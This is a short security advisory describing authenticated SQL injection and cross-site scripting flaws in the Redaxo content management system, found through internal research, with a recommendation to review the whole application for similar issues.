Impact
======
Redaxo is an easy to use open source content management system. A user can create his own website using the Redaxo CMS.
During internal research, multiple vulnerabilities were identified in the Redaxo CMS software.
The software is vulnerable to an SQL-Injection attack, allowing an authenticated user to access the database in an unsafe way.
Some parts of the application do not have sufficient input validation and output encoding. This means user supplied input is inserted in an unsafe way
resulting in a Cross Site Scripting vulnerability.

The following vulnerabilities are only examples. It is highly recommended to check the whole application for similar vulnerabilities.
